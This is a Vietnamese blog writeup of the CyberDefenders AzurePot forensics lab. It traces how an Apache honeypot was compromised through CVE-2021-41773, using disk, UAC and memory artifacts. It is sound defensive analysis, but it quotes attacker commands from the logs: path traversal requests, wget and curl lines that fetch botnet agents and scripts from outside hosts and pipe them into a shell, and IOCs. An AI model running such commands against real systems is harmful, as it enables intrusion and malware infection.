+++
title = "CyberDefenders - AzurePot Writeup"
date = 2026-09-24T10:00:00+07:00
draft = false
tags = ["DFIR", "Endpoint Forensics", "Linux", "CyberDefenders", "Volatility", "FTK Imager"]
categories = ["Writeups"]
summary = "Điều tra một honeypot Ubuntu trên Azure bị khai thác CVE-2021-41773: phân tích disk image, UAC và memory dump."
ShowToc = true
TocOpen = false
+++

## Tổng quan

Lab AzurePot mô phỏng một honeypot Ubuntu chạy Apache trên Azure, cố tình để lộ lỗ hổng **CVE-2021-41773** (path traversal dẫn tới RCE). Máy bị nhiều nhóm tấn công nhắm tới, chủ yếu là mã độc đào coin và botnet. Đề bài cho 3 artifact:

| Artifact | Nội dung | Dùng để |
|---|---|---|
| `sdb.vhd` | Snapshot ổ đĩa | Xem cron, log Apache, file mã độc |
| `uac.tgz` | Kết quả thu thập của Unix Artifact Collector | Xem process, environ, user |
| `ubuntu.20211208.mem` | Memory dump (LiME) | Xem interface mạng, bash history |

**Công cụ:** FTK Imager, Notepad++, grep/awk, Volatility 2, CyberChef, VirusTotal.

---

## Phân tích

### Q1: File => sdb.vhd | Script chạy mỗi phút để dọn dẹp tên là gì?

Mình mount `sdb.vhd` bằng FTK Imager ở chế độ **File System / Read Only** để không làm thay đổi bằng chứng.

![FTK Imager Mount](/images/1.png)

Sau khi mount, vào `var/spool/cron/crontabs` sẽ thấy file `root`, tức crontab của user root.

![Cron Root File](/images/2.png)

Mở file bằng Notepad++, dòng có 5 dấu `*` nghĩa là chạy mỗi phút:

```bash
* * * * * /root/.remove.sh
```

![Nội dung crontab](/images/3.png)

**Đáp án:** `.remove.sh`

---

### Q2: File => sdb.vhd | Script ở Q1 kill process của 2 mã độc đào coin. Tên file thứ nhất?

Mở `/root/.remove.sh`, vòng `for` đầu tiên lọc process theo tên rồi `kill -9`:

```bash
for PID in `ps -ef | egrep "kinsing|kdevtmp" | grep "/tmp" | awk '{ print $2 }'`
```

![Nội dung .remove.sh](/images/4.png)

Hai tên bị nhắm tới là `kinsing` và `kdevtmp`.

**Đáp án:** `kinsing`

---

### Q3: File => sdb.vhd | Script đổi quyền các file thành gì?

Cũng trong `.remove.sh`, sau khi kill process thì script chạy:

```bash
chown root:root /tmp/k*
chmod 444 /tmp/k*
```

![chown và chmod](/images/5.png)

`444` = chỉ đọc cho owner, group và others. Không ai có quyền ghi hay thực thi, nên mã độc trong `/tmp/k*` không chạy lại được.

**Đáp án:** `444`

---

### Q4: File => sdb.vhd | SHA256 của botnet agent là gì?

**Bước 1: Xác nhận bị khai thác CVE-2021-41773.** Trong `/var/log/apache2/access_log` có nhiều request dạng path traversal mã hóa `%2e`, ví dụ:

```
/cgi-bin/.%2e/%2e/%2e/%2e/etc/passwd
/cgi-bin/.%2e/%2e/%2e/%2e/bin/sh
```

Các POST từ `176.10.99.200` trả về **200 OK**, tức RCE đã thành công.

![Access log](/images/6.png)

**Bước 2: Tìm hành vi sau khai thác.** Grep `chmod` trong `error_log` thì thấy attacker dùng `wget` tải file `dk86` về `/tmp`, cấp quyền thực thi rồi chạy.

![Error log](/images/7.png)

File sau đó được chuyển sang `/var/tmp` (thư mục này không bị xóa khi reboot).

![dk86 trong /var/tmp](/images/8.png)

**Bước 3: Tính hash.**

```bash
sha256sum dk86
```

```
0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049
```

![sha256sum](/images/9.png)

Kiểm tra trên VirusTotal: file ELF, bị nhiều engine gắn nhãn trojan.

![VirusTotal](/images/10.png)

**Đáp án:** `0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049`

---

### Q5: File => sdb.vhd | Botnet ở Q4 tên là gì?

Phần *Popular threat label / Family labels* trên VirusTotal ghi `tsunami`, `iznqt`, `kaiten`; nhiều AV gọi là `Backdoor.Linux.Tsunami` hoặc `ELF:Tsunami`. Đây là botnet DDoS trên Linux.

![Family labels](/images/11.png)

**Đáp án:** `Tsunami`

---

### Q6: File => sdb.vhd | IP nào khớp với thời điểm tạo file botnet agent?

Xem timestamp tạo file `dk86` (11/11/2021 lúc 19:07), rồi đối chiếu với các dòng `wget` trong `error_log` cùng thời điểm.

![Timestamp file dk86](/images/12.png)

![Error log khớp thời gian](/images/13.png)

IP thực hiện lệnh là `141.135.85.36` (xuất hiện lặp lại với nhiều source port khác nhau).

**Đáp án:** `141.135.85.36`

---

### Q7: File => sdb.vhd | Attacker tải botnet agent từ URL nào?

Lệnh nằm trong `error_log`:

```bash
wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86;
```

![Lệnh wget](/images/14.png)

Đường dẫn `wp-content/themes/twentysixteen` cho thấy khả năng một site WordPress khác đã bị chiếm để làm nơi chứa mã độc.

**Đáp án:** `http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86`

---

### Q8: File => sdb.vhd | File attacker tải về để chạy script độc hại rồi tự xóa?

Mình lọc bỏ các URL quen thuộc (Google, Microsoft...) khỏi log và thấy một URL đáng ngờ:

```
http://116.203.212.184/1010/b64.php
```

![URL b64.php](/images/15.png)

Lệnh gọi tới nó:

```bash
curl -s http://116.203.212.184/1010/b64.php -u client:%@123-456%@ --data-urlencode "s=<Base64_String>" | sh
```

![Lệnh curl](/images/16.png)

Chuỗi base64 được pipe thẳng vào `sh`. Giải mã bằng CyberChef:

- Chuỗi thứ nhất: tải thêm script khác về chạy.

  ![CyberChef 1](/images/17.png)

- Chuỗi thứ hai: có lệnh xóa dấu vết `rm -rf .install`.

  ![CyberChef 2](/images/18.png)

**Đáp án:** `b64.php`

---

### Q9: File => sdb.vhd | Các script `.sh` attacker đã tải?

Grep `.sh` trong log:

![Grep .sh](/images/19.png)

| Script | Nguồn | Cách chạy |
|---|---|---|
| `ap.sh` | `45.137.155.55` | `curl -s ... \| bash` hoặc `wget -q -O - ... \| bash` (chạy trực tiếp, không lưu file) |
| `0_cron.sh` | `103.55.36.245` | `wget` → `chmod 777` → `sh` |
| `0_linux.sh` | `103.55.36.245` | `wget` → `chmod 777` → `sh` |

**Đáp án:** `ap.sh`, `0_cron.sh`, `0_linux.sh`

---

### Q10: File => UAC | Hai process chạy từ thư mục đã bị xóa, PID là gì?

Trong dữ liệu process của UAC, grep từ khóa `deleted`:

```bash
grep -r "deleted" .
```

![Grep deleted](/images/20.png)

Có hai process cùng chạy từ `/tmp/.log/101068 (deleted)`, tức file thực thi đã bị xóa nhưng process vẫn còn sống trong bộ nhớ, một dấu hiệu kinh điển của mã độc.

**Đáp án:** `6388`, `20645`

---

### Q11: File => UAC | Command line của PID thứ hai ở Q10?

Tra PID `20645` trong dữ liệu process:

![Command line PID 20645](/images/21.png)

Đó là `sh .src.sh`: một script ẩn (tên bắt đầu bằng dấu chấm) nằm trong `/var/tmp/.log/101068/` và đã bị xóa.

**Đáp án:** `sh .src.sh`

---

### Q12: File => UAC | Remote IP và port dùng trong cuộc tấn công?

UAC lưu biến môi trường của từng process trong `environ.txt`. Mở file của PID `20645` và tìm `REMOTE_ADDR` / `REMOTE_PORT`:

![environ.txt](/images/22.png)

**Đáp án:** `116.202.187.77:56590`

---

### Q13: File => UAC | User nào chạy lệnh ở Q11?

Đối chiếu PID `20645` trong `ps-ef.txt` (hoặc `running_processes_full_paths.txt`):

![User chạy process](/images/23.png)

Process chạy dưới user `daemon`, đúng với việc Apache thường chạy bằng tài khoản này, hợp lý vì attacker đi vào qua RCE của web server.

**Đáp án:** `daemon`

---

### Q14: File => UAC | Hai shell process chạy từ thư mục tmp, PID là gì?

Xem thư mục `live_response/process` của UAC, lọc các process `sh` có đường dẫn trong `/tmp`:

![Shell chạy từ /tmp](/images/24.png)

**Đáp án:** `15853`, `21785`

---

### Q15: File => ubuntu.20211208.mem | MAC address của máy bị capture?

Với Volatility 2, trước hết phải tự tạo một **Linux profile** khớp với kernel của máy Ubuntu bị capture (hướng dẫn tạo profile xem ở [bài blog này](https://beguier.eu/nicolas/articles/security-tips-3-volatility-linux-profiles.html)). Có profile rồi thì dùng plugin `linux_ifconfig` để lấy thông tin card mạng (IP, MAC, trạng thái) từ memory dump.

![linux_ifconfig](/images/25.png)

Interface `lo` là loopback (MAC toàn số 0), còn `eth0` (`10.0.0.4`) là card mạng chính.

**Đáp án:** `00:22:48:26:3b:16`

---

### Q16: File => ubuntu.20211208.mem | Trong bash history, attacker tải script `.sh` nào?

Dùng plugin `linux_bash` (cùng profile đã tạo ở Q15) để khôi phục lịch sử lệnh bash còn nằm trong bộ nhớ, rồi lọc các lệnh `wget` / `curl`.

![linux_bash](/images/26.png)

Attacker đã dùng `wget` tải `unk.sh` từ `185.191.32.198`.

**Đáp án:** `unk.sh`

---

## Tổng kết

**Chuỗi tấn công:**

1. Khai thác **CVE-2021-41773** trên Apache để có RCE.
2. Tải và chạy botnet agent `dk86` (Tsunami), cùng nhiều script `.sh` khác.
3. Dùng `curl ... | sh` với payload base64 để giấu nội dung và tự xóa dấu vết.
4. Chạy process từ file đã bị xóa (`/tmp/.log/101068`) để né phát hiện.

**IOC chính:**

| Loại | Giá trị |
|---|---|
| SHA256 `dk86` | `0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049` |
| Host tải malware | `138.197.206.223`, `116.203.212.184`, `45.137.155.55`, `103.55.36.245`, `185.191.32.198` |
| IP tấn công | `176.10.99.200`, `141.135.85.36`, `116.202.187.77` |
| File/Script | `dk86`, `b64.php`, `ap.sh`, `0_cron.sh`, `0_linux.sh`, `unk.sh`, `.src.sh` |

**Bài học:** Kết hợp ba nguồn (disk, UAC, memory) cho bức tranh đầy đủ hơn hẳn từng nguồn riêng lẻ. Disk cho thấy log và file, UAC cho thấy trạng thái process lúc thu thập, memory lưu lại những thứ attacker đã cố xóa.
